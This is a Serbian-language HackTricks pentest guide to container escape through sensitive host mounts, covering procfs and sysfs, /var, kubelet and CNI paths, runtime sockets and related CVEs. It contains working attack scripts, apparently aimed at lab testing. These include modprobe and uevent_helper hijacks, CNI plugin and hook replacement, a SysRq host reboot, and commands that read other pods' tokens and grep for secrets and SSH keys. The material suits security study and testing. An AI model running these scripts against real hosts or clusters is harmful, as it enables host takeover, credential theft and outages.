# Osetljiva montiranja hosta

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Host montiranja predstavljaju jednu od najvažnijih praktičnih površina za container escape, jer često ukidaju pažljivo izolovan prikaz procesa i ponovo omogućavaju direktan pristup host resursima. Opasni slučajevi nisu ograničeni na `/`. Bind montiranja za `/proc`, `/sys`, `/var`, runtime socket-e, stanje kojim upravlja kubelet ili putanje povezane sa uređajima mogu izložiti kontrole kernela, akreditive, sisteme datoteka susednih container-a i interfejse za upravljanje runtime-om.

Ova stranica postoji odvojeno od pojedinačnih stranica o zaštiti zato što model zloupotrebe obuhvata više oblasti. Montiranje hosta sa dozvolom za pisanje opasno je delom zbog mount namespace-a, delom zbog user namespace-a, delom zbog pokrivenosti AppArmor-om ili SELinux-om, a delom zbog konkretne host putanje koja je izložena. Razmatranje ove teme zasebno olakšava analizu površine napada.

Takođe uporedite host direktorijum u koji može da se upisuje sa odgovarajućom putanjom unutar svakog container-a. Ako je montiran preko direktorijuma izvršnih startup skripti, korisnik sa nižim privilegijama na hostu može postaviti kod koji će entrypoint container-a sa višim privilegijama učitati pri sledećem restartu. Proverite tačan bind izvor i odredište, dozvole za upis/pretragu direktorijuma, petlju entrypoint-a i zahtev da datoteka bude izvršna, runtime UID i stvarni okidač za restart. UID 0 u container-u ne znači automatski UID 0 na hostu; efekat na hostu zavisi od mapiranja user namespace-a i mount politike. Pasivna provera treba da prijavi putanje i dozvole, bez upisivanja skripte ili restartovanja workload-a.

Linux container može da radi unutar upravljačke VM koja deli deo zasebnog Windows host sistema datoteka. [Shared folder-i u VirtualBox-u](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) predstavljaju jedan od načina da host datoteke postanu vidljive u guest-u, ali root u toj VM i dalje ima drugačiji identitet od Windows administratora. Ako share izlaže čitljiv privatni SSH ključ korisnika, tretirajte ga kao trag do akreditiva: proverite tačno montiranje koje potiče sa hosta, vlasništvo nad ključem i pristup, odgovarajući nalog i **efektivnu** politiku authorized-key Windows SSH servera pre nego što zaključite da ključ omogućava prijavu na host. Savremeni [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) za administratorske naloge najčešće koristi zasebnu datoteku `administrators_authorized_keys`. Ne uključujte sadržaj privatnih ključeva u uobičajen izlaz enumeracije; metapodaci o montiranju i putanji ključa dovoljni su za pasivnu početnu procenu.

## Izloženost `/proc`

procfs sadrži i uobičajene informacije o procesima i interfejse za kontrolu kernela sa ozbiljnim posledicama. Zato bind montiranje kao što je `-v /proc:/host/proc` ili prikaz container-a koji izlaže neočekivane writable proc stavke može dovesti do otkrivanja informacija, uskraćivanja usluge ili direktnog izvršavanja koda na hostu.

Procfs putanje visoke vrednosti uključuju:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (naročito `register` i `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Zloupotreba

Počnite proverom koje su procfs stavke visoke vrednosti vidljive ili writable:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Ove putanje su zanimljive iz različitih razloga. `core_pattern`, `modprobe` i `binfmt_misc` mogu postati putanje za izvršavanje koda na hostu kada imaju dozvolu za upis. `kallsyms`, `kmsg`, `kcore` i `config.gz` moćni su izvori za izviđanje prilikom eksploatacije kernela. `sched_debug` i `mountinfo` otkrivaju kontekst procesa, cgroup-a i fajl-sistema koji može pomoći da se rekonstruiše raspored hosta iz kontejnera.

Praktična vrednost svake putanje je različita, a tretiranje svih kao da imaju isti uticaj otežava triage:

- `/proc/sys/kernel/core_pattern`
  Ako ima dozvolu za upis, ovo je jedna od najuticajnijih procfs putanja jer će kernel nakon pada izvršiti pipe handler. Kontejner koji može da postavi `core_pattern` na payload sačuvan u svom overlay-u ili na montiranoj putanji hosta često može da dobije izvršavanje koda na hostu. Pogledajte i [read-only-paths.md](protections/read-only-paths.md) za poseban primer.
- `/proc/sys/kernel/modprobe`
  Ova putanja određuje userspace pomoćni program koji kernel koristi kada treba da pozove logiku za učitavanje modula. Ako može da se menja iz kontejnera i tumači u kontekstu hosta, može postati još jedan mehanizam za izvršavanje koda na hostu. Posebno je zanimljiva u kombinaciji sa načinom za pokretanje putanje pomoćnog programa.
- `/proc/sys/vm/panic_on_oom`
  Ovo obično nije jednostavan mehanizam za bekstvo, ali može da pretvori pritisak na memoriju u uskraćivanje usluge na nivou celog hosta tako što OOM stanja pretvara u ponašanje koje izaziva kernel panic.
- `/proc/sys/fs/binfmt_misc`
  Ako interfejs za registraciju ima dozvolu za upis, napadač može da registruje handler za izabranu magic vrednost i dobije izvršavanje u kontekstu hosta kada se izvrši fajl koji se podudara.
- `/proc/config.gz`
  Koristan je za triage eksploatacije kernela. Pomaže da se utvrdi koji su podsistemi, mere ublažavanja i opcione funkcije kernela uključeni, bez potrebe za metapodacima paketa hosta.
- `/proc/sysrq-trigger`
  Uglavnom je putanja za uskraćivanje usluge, ali veoma ozbiljna. Može odmah da ponovo pokrene host, izazove panic ili ga na drugi način omete.
- `/proc/kmsg`
  Otkriva poruke iz kružnog bafera kernela. Koristan je za fingerprinting hosta, analizu pada i, u nekim okruženjima, za curenje informacija koje pomažu pri eksploataciji kernela.
- `/proc/kallsyms`
  Vredan je kada je čitljiv jer izlaže informacije o eksportovanim simbolima kernela i može pomoći u zaobilaženju pretpostavki o nasumičnom raspoređivanju adresa tokom razvoja kernel exploita.
- `/proc/[pid]/mem`
  Ovo je direktan interfejs ka memoriji procesa. Ako je ciljni proces dostupan uz neophodne ptrace-uslove, može omogućiti čitanje ili izmenu memorije drugog procesa. Realni uticaj u velikoj meri zavisi od akreditiva, `hidepid`, Yama i ptrace ograničenja, pa je ovo moćna, ali uslovna putanja.
- `/proc/kcore`
  Izlaže prikaz memorije sistema u obliku slike jezgra. Fajl je ogroman i nezgodan za upotrebu, ali ako je u značajnoj meri čitljiv, to ukazuje na ozbiljno izloženu površinu memorije hosta.
- `/dev/kmem` i `/dev/mem`
  Ovo su istorijski veoma uticajni interfejsi **uređaja** za pristup sirovoj memoriji, a ne procfs fajlovi. Na mnogim modernim sistemima ne postoje ili su strogo ograničeni, ali kontejner koji može da otvori montiranu kopiju sa hosta treba da tretira izloženost kao kritičnu. Proverite ih zajedno sa drugim osetljivim `/dev` mount-ovima, umesto da tražite nepostojeće putanje `/proc/kmem` ili `/proc/mem`.
- `/proc/sched_debug`
  Leaks informacije o raspoređivanju i zadacima koje mogu da otkriju identitete procesa na hostu čak i kada drugi prikazi procesa deluju čistije nego što bi se očekivalo.
- `/proc/[pid]/mountinfo`
  Izuzetno je korisna za rekonstrukciju mesta na kom se kontejner zaista nalazi na hostu, određivanje putanja koje koriste overlay i utvrđivanje da li mount sa dozvolom za upis odgovara sadržaju hosta ili samo sloju kontejnera.

Ako su `/proc/[pid]/mountinfo` ili detalji overlay-a čitljivi, upotrebite ih da utvrdite putanju na hostu do fajl-sistema kontejnera:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Ove komande su korisne jer je za brojne trikove za izvršavanje na hostu potrebno pretvoriti putanju unutar kontejnera u odgovarajuću putanju iz perspektive hosta.

### Primer: Priprema putanje pomoćnog programa za `modprobe`

Ako je `/proc/sys/kernel/modprobe` moguće upisivati iz kontejnera, a putanja pomoćnog programa tumači se u kontekstu hosta, može se preusmeriti na payload koji kontroliše napadač. Gornji direktorijum overlay sistema mora da se razreši na hostu, a dokazni izlaz mora da se upiše u isti hostu vidljiv sloj kontejnera ako kontejner ne montira i hostov `/tmp`:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Tačan okidač zavisi od cilja i ponašanja kernela i namerno se ne nagađa. Vratite prvobitnu vrednost pre nego što napustite laboratoriju. Važno je da putanja pomoćnog programa sa dozvolom za pisanje može da preusmeri buduće pozivanje pomoćnog programa kernela na sadržaj host putanje pod kontrolom napadača. Ovaj lanac se prekida ako nedostaje overlay `upperdir`, ako host ne može da razreši putanju, ako je sysctl mount samo za čitanje ili ako kernel nikada ne pozove izabrani pomoćni program.

### Potpun primer: Kernel Recon pomoću `kallsyms`, `kmsg` i `config.gz`

Ako je cilj procena mogućnosti eksploatacije, a ne neposredno bekstvo:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Ove komande pomažu da se utvrdi da li su dostupne korisne informacije o simbolima, da li nedavne poruke kernela otkrivaju zanimljivo stanje i koje su funkcije ili mere zaštite kernela uključene pri kompajliranju. Uticaj obično nije direktan escape, ali može znatno da ubrza procenu ranjivosti kernela.

### Primer u celosti: ponovno pokretanje hosta pomoću SysRq

Ako je `/proc/sysrq-trigger` upisiv i dostupan iz host prikaza:

```bash
echo b > /proc/sysrq-trigger
```

Efekat je trenutno ponovno pokretanje hosta. Ovo nije suptilan primer, ali jasno pokazuje da izlaganje procfs-a može imati mnogo ozbiljnije posledice od otkrivanja informacija.

## Izlaganje `/sys`

sysfs izlaže velike količine informacija o stanju kernela i uređaja. Neke putanje u sysfs-u uglavnom služe za fingerprinting, dok druge mogu da utiču na izvršavanje pomoćnih programa, ponašanje uređaja, konfiguraciju bezbednosnih modula ili stanje firmware-a.

Putanje u sysfs-u koje su posebno vredne za proveru obuhvataju:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ove putanje su značajne iz različitih razloga. `/sys/class/thermal` može da utiče na ponašanje upravljanja temperaturom, a time i na stabilnost hosta u okruženjima sa neadekvatnim ograničenjima. `/sys/kernel/vmcoreinfo` može da otkrije informacije o dump-ovima nakon pada sistema i rasporedu kernela, što pomaže pri niskonivovskom fingerprinting-u hosta. `/sys/kernel/security` je interfejs `securityfs` koji koriste Linux Security Modules, pa neočekivан pristup može da otkrije ili izmeni stanje povezano sa MAC-om. Putanje EFI promenljivih mogu da utiču na podešavanja pokretanja sistema koja se čuvaju u firmware-u, što ih čini mnogo ozbiljnijim od običnih konfiguracionih datoteka. `debugfs` u okviru `/sys/kernel/debug` posebno je opasan jer je namerno namenjen programerima i za njega važi znatno manje bezbednosnih očekivanja nego za kernel API-je namenjene produkcionim sistemima.

Svaka sysfs stavka sa ove liste zavisi od **kernela, konfiguracije i hardvera**. Uobičajeni savremeni virtuelizovani čvorovi često uopšte nemaju `uevent_helper`, EFI promenljive ni stavke termičkih uređaja. Odsutnu putanju zabeležite kao negativan preduslov umesto da pretpostavite da primer sa drugog kernela važi i ovde.

Korisne komande za proveru ovih putanja su:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Šta ove komande čini zanimljivim:

- `/sys/kernel/security` može da otkrije da li su AppArmor, SELinux ili neki drugi LSM vidljivi na način koji je trebalo da bude dostupan samo hostu.
- `/sys/kernel/debug` je često najalarmantniji nalaz u ovoj grupi. Ako je `debugfs` montiran i može da se čita ili u njega upisuje, očekujte široku površinu izloženu kernelu, čiji tačan rizik zavisi od omogućenih debug čvorova.
- Izloženost EFI promenljivih je ređa, ali ima veliki uticaj jer se odnosi na podešavanja zasnovana na firmveru, a ne na obične datoteke u runtime okruženju.
- `/sys/class/thermal` je uglavnom relevantan za stabilnost hosta i interakciju sa hardverom, a ne za jednostavan izlaz iz kontejnera pomoću shell-a.
- `/sys/kernel/vmcoreinfo` je uglavnom izvor podataka za identifikaciju hosta i analizu padova, koristan za razumevanje niskonivovskog stanja kernela.

### Potpun primer: `uevent_helper`

`/sys/kernel/uevent_helper` zavisi od kernela i konfiguracije i nedostaje na mnogim aktuelnim sistemima. Ako postoji, može da se upisuje u njega i dostupan je upotrebljiv `uevent` okidač, kernel može da izvrši helper pod kontrolom napadača. Dokazni izlaz mora da koristi putanju koja je vidljiva i iz perspektive hosta i iz perspektive kontejnera:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Razlog zašto ovo funkcioniše jeste to što se putanja pomoćnog programa tumači iz perspektive hosta. Kada se aktivira, pomoćni program se pokreće u kontekstu hosta, a ne unutar trenutnog kontejnera. `/sys/class/mem/null/uevent` je jedan konkretan okidač na kernelima koji ga izlažu; drugi uređaji mogu izlagati sopstvene `uevent` datoteke, ali nemojte nasumično birati neku na stvarnom hardveru. Vratite prvobitnu vrednost pre nego što napustite lab. Nemojte navoditi da je ova tehnika dostupna ako pomoćna datoteka ili kontrolisani okidač nisu prisutni.

## Izloženost direktorijuma `/var`

Montiranje hostovog direktorijuma `/var` u kontejner često se potcenjuje jer ne deluje toliko dramatično kao montiranje direktorijuma `/`. U praksi, to može biti dovoljno za pristup runtime socketima, direktorijumima sa snapshotovima kontejnera, kubelet-om upravljanim pod volumenima, projektovanim service-account tokenima i susednim fajl sistemima aplikacija. Na modernim čvorovima, `/var` je često mesto na kojem se zapravo nalazi operativno najzanimljivije stanje kontejnera.

### Primer za Kubernetes

Pod sa `hostPath: /var` često može da čita projektovane tokene drugih podova i sadržaj overlay snapshotova:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Ove komande su korisne jer pokazuju da li mount izlaže samo bezazlene podatke aplikacije ili kredencijale klastera visokog uticaja. Čitljiv service-account token može odmah da omogući pristup Kubernetes API-ju putem lokalnog izvršavanja koda.

Ako je token prisutan, proverite čemu može da pristupi, umesto da se zaustavite na pronalaženju tokena:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Uticaj ovde može biti mnogo veći od lokalnog pristupa čvoru. Token sa širokim RBAC ovlašćenjima može da pretvori montirani `/var` u kompromitovanje celog klastera.

### Primer za Docker i containerd

Na Docker hostovima relevantni podaci se često nalaze u `/var/lib/docker`, dok se na Kubernetes čvorovima koji koriste containerd mogu nalaziti u `/var/lib/containerd` ili putanjama specifičnim za snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Ako montirani `/var` izlaže sadržaj snapshot-a drugog radnog opterećenja koji može da se menja, napadač može da izmeni datoteke aplikacije, postavi web sadržaj ili promeni skripte za pokretanje, a da ne dira konfiguraciju trenutnog kontejnera.

Na **privremenom lab radnom opterećenju**, sadržaj snapshot-a koji može da se menja može da posluži za demonstraciju neovlašćenih izmena aplikacije, oporavka tajni ili lateralnog kretanja. Najpre mapirajte ID kontejnera u runtime-u na tačan snapshot i nikada ne menjajte nepovezan ili produkcioni snapshot:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Ove komande su korisne jer prikazuju tri glavne grupe posledica montiranja `/var`: neovlašćene izmene aplikacija, pribavljanje tajni i lateralno kretanje u susedna radna opterećenja.

Direktno upisivanje u snapshot zaobilazi uobičajeno upravljanje stanjem u runtime-u i može da ošteti kontejner ili uništi dokaze. Otkrivanje samo za čitanje lokalno je ponovljeno nad Docker `overlay2`: oznaka upisana u susednom privremenom kontejneru pojavila se ispod `/var/lib/docker/overlay2/<id>/diff/`. Stvarne izmene snapshot-a ograničite na privremeni kontejner napravljen za taj test.

## Stanje Kubelet-a, dodaci i CNI putanje

Montiranje putanje `/var/lib/kubelet`, `/opt/cni/bin` ili `/etc/cni/net.d` često je izloženo kroz privilegovane DaemonSet-ove, CNI agente, CSI dodatke za čvorove, GPU operatore i pomoćne alate za skladištenje. Lako je odbaciti ova montiranja kao „pomoćnu infrastrukturu čvora“, ali ona se nalaze direktno u putanji izvršavanja novih podova i često sadrže kubelet akreditive, projektovane tajne, registracione sokete i izvršne binarne datoteke dodataka na hostu.

Ciljevi visoke vrednosti uključuju:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Korisne komande za pregled su:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Zašto su ove putanje važne:

- `/var/lib/kubelet/pki` može da izloži klijentske sertifikate kubelet-a i druge lokalne akreditive čvora, koji se ponekad mogu ponovo upotrebiti protiv API servera ili TLS krajnjih tačaka koje koriste kubelet, u zavisnosti od dizajna klastera.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` često sadrži projektovane service-account tokene i montirane Secrets za susedne podove na istom čvoru.
- `/var/lib/kubelet/pod-resources/kubelet.sock` je prvenstveno površina za izviđanje, ali veoma korisna: otkriva koji podovi i kontejneri trenutno koriste GPU-ove, hugepages, SR-IOV uređaje i druge oskudne resurse lokalne za čvor.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` i `/var/lib/kubelet/plugins_registry` otkrivaju koji su CSI, DRA i device plugin-i instalirani i sa kojim socket-ima kubelet treba da komunicira. Ako su ti direktorijumi upisivi, a ne samo čitljivi, nalaz postaje mnogo ozbiljniji.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` i `/etc/cni/net.d` nalaze se direktno na putanji za podešavanje pod mreže. Upisiv pristup tamo često predstavlja odloženi primitive za host execution, a ne samo izlaganje konfiguracije.<sup>[[2]](#references)</sup>

### Potpun primer: upisiv `/opt/cni/bin`

Ako je direktorijum host CNI binarnih datoteka montiran uz read-write pristup, zamena plugina može biti dovoljna za dobijanje host execution-a sledeći put kada kubelet kreira pod sandbox na tom čvoru:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Ovo nije toliko neposredno kao montirani `docker.sock`, ali je često realističnije u kompromitovanim Kubernetes infrastrukturnim podovima. Marker se upisuje pored montiranog dodatka, tako da kontejner može da ga preuzme čak i bez montiranja host-root direktorijuma ili host-`/tmp` direktorijuma. Wrapper čuva originalne argumente i standardni ulaz, a zatim primer vraća originalnu binarnu datoteku. Važno je to što izmenjenu binarnu datoteku kasnije izvršava tok podešavanja host mreže, a ne trenutni kontejner. Koristite samo čvor namenjen za testiranje, jer neispravan wrapper može sprečiti da novi Pod sandboxovi dobiju mrežno povezivanje.

## Runtime soketi

Osetljiva montiranja sa hosta često uključuju runtime sokete, a ne čitave direktorijume. Toliko su važni da zaslužuju da ih ovde izričito ponovimo:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Pogledajte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) za kompletne tokove eksploatacije kada se jedan od ovih socket-a montira.

Kao brz obrazac za prvu interakciju:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Ako jedan od ovih pokušaja uspe, put od „mounted socket“ do pokretanja privilegovanijeg sibling containera obično je mnogo kraći od bilo kog puta za kernel breakout.

Isti pristup daemon-u može da se iskoristi i za uspostavljanje **postojanosti na host-u**. Helper container sa writable host-root bind mount-om može da primi fajlove preko `docker cp`, a zatim pomoću `docker exec` postavi SSH ključ, service unit ili drugu datoteku za postojanost u montiranu host putanju. Bezbednosna granica je ovlašćenje daemon-a da kreira host mount; `docker cp` je samo korak za pripremu. Nakon izlaganja runtime socket-a, proveravajte i novokreirane containere i upise u host putanje za autentifikaciju ili pokretanje.

## Otmica zadatka preko writable host putanje

Writable host mount ne mora da izlaže `/` da bi bio opasan. Ako montirana putanja sadrži skripte, konfiguracione datoteke, hook-ove, plug-inove ili datoteke koje kasnije koristi host-side zakazani zadatak ili servis, container može da izmeni ono što host izvršava.

Opšti tok provere:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Ako host proces koristi datoteku u koju je moguće upisivati, neka payload tokom testiranja bude jednostavan i lako uočljiv:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Zanimljiv deo je granica poverenja: upis se obavlja iz kontejnera, ali se izvršavanje dešava kasnije u kontekstu host servisa. Tako se uski hostPath ili bind mount pretvara u primitiv za odloženo izvršavanje koda na hostu.

## Datoteke u vlasništvu root-a na deljenoj host putanji

Nalog u kontejneru koji može da postane root možda može da postavi datoteku u vlasništvu root-a na putanju koja je upisiva i koristi je i host. Ako se UID 0 u kontejneru mapira na UID 0 na hostu, oba prikaza odnose se na istu datoteku, a host mount dozvoljava SUID izvršavanje, host korisnik koji može da pokrene SUID izvršnu datoteku u vlasništvu root-a na toj putanji možda može da pređe granicu privilegija hosta. Za ovaj konkretan problem vlasništva nad datotekom, kontejner ne mora da se pokreće sa `--privileged`. Pogledajte [mapiranja user namespace](protections/namespaces/user-namespace.md) i [diskusiju o SUID-u](privileged-containers.md) za zasebne uslove.

Pregledajte putanju **sa obe strane**: uporedite vlasništvo i identitet bezopasne datoteke, proverite `uid_map` i `gid_map` kontejnera i ispitajte opcije mount-a i pravila izvršavanja na hostu. `rw` na strani kontejnera bez `nosuid` samo ukazuje na moguću putanju; ne potvrđuje vlasništvo na hostu, zastavice mount-a na hostu, pristup host korisnika niti to da li AppArmor/SELinux blokira izvršavanje. `noexec` ograničava izvršavanje u prikazu u kom se primenjuje. Oznake `shared:` i `master:` u `/proc/self/mountinfo` opisuju propagaciju mount-a, a ne to da li se sadržaj datoteke deli sa hostom. Bind mount možda nema te oznake. Ponovna upotreba akreditiva koja omogućava prijavu na host zaseban je korak u odnosu na granicu privilegija zasnovanu na deljenoj datoteci.

Skladište runtime-a na hostu može da stvori sličnu putanju čak i bez eksplicitnog bind mount-a. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) je omogućio neprivilegovanom host korisniku da prolazi kroz poddirektorijume Docker podataka i izvršava datoteke iz sistema datoteka kontejnera; Moby je ispravio dozvole u verziji 20.10.9 i napominje da pokrenuti kontejneri moraju da se restartuju kako bi se ispravili njihovi direktorijumi. Pregledajte tačne putanje mount-a `overlay2/<id>/merged` i dozvole za pretragu u svakom nadređenom direktorijumu, a zatim utvrdite da li se UID 0 kontejnera mapira na UID 0 hosta, da li je prisutna i dostupna stvarna SetUID izvršna datoteka u vlasništvu root-a i da li prikaz na hostu dozvoljava SetUID izvršavanje. Rootless kontejneri ili kontejneri sa remapiranjem user namespace, `nosuid`, `noexec`, `no_new_privs` i MAC pravila mogu da promene ishod. Sama verzija runtime-a ili prohodna putanja povod su za proveru, a ne dokaz izvršavanja sa privilegijama root-a na hostu; pregledajte metapodatke mount-a i datoteke bez pokretanja moguće izvršne datoteke.

## CVE-ovi povezani sa mount-ovima

Host mount-ovi se prepliću i sa ranjivostima runtime-a. Važni noviji primeri obuhvataju:

- `CVE-2024-21626` u `runc`, gde je procureli deskriptor direktorijuma mogao da postavi radni direktorijum na sistem datoteka hosta.
- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` u BuildKit-u, gde su zlonamerni Dockerfile-ovi, frontendi i tokovi `RUN --mount` mogli ponovo da omoguće pristup host datotekama, njihovo brisanje ili povišene privilegije tokom build-ova.
- `CVE-2024-1753` u Buildah i Podman build tokovima, gde su posebno napravljeni bind mount-ovi tokom build-a mogli da izlože `/` sa dozvolama za čitanje i upis.
- `CVE-2025-47290` u `containerd` 2.1.0, gde je TOCTOU tokom raspakivanja image-a mogao da omogući posebno napravljenom image-u da izmeni sistem datoteka hosta tokom preuzimanja.

Ovi CVE-ovi su ovde važni jer pokazuju da upravljanje mount-ovima nije samo pitanje konfiguracije operatora. Sam runtime takođe može da uvede uslove za escape zasnovane na mount-ovima.

## Provere

Koristite ove komande da brzo pronađete mount izloženosti najveće vrednosti:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Šta je ovde zanimljivo:

- Host root, `/proc`, `/sys`, `/var` i runtime socketi su nalazi visokog prioriteta.
- Upisivi unosi u proc/sys često znače da mount izlaže globalne kontrole jezgra hosta, a ne bezbedan prikaz kontejnera.
- Putanje za `/var` koje su montirane zahtevaju proveru kredencijala i susednih workload-a, a ne samo pregled sistema datoteka.
- Direktorijumi sa stanjem kubelet-a i putanje za CNI/dodatke zaslužuju isti prioritet kao runtime socketi, jer se često nalaze direktno na putanji za kreiranje pod-ova i distribuciju kredencijala na čvoru.

## Status lokalne validacije

Praktični lanci na ovoj stranici provereni su na lokalnom Linux minikube čvoru. Validacija je ponovila:

- pristup za čitanje i upis preko privremenog, upisivog hostPath-a
- otkrivanje projektovanih ServiceAccount tokena i montiranih Secrets preko `/var/lib/kubelet/pods`
- uspešnu Kubernetes API autentifikaciju pomoću važećeg tokena preuzetog iz tog montiranog kubelet stanja
- otkrivanje Docker `overlay2` sistema datoteka susednog kontejnera samo za čitanje preko montiranog `/var`
- kreiranje susednog kontejnera preko Docker API-ja sa host bind mount-om samo za čitanje, preko montiranog `docker.sock`
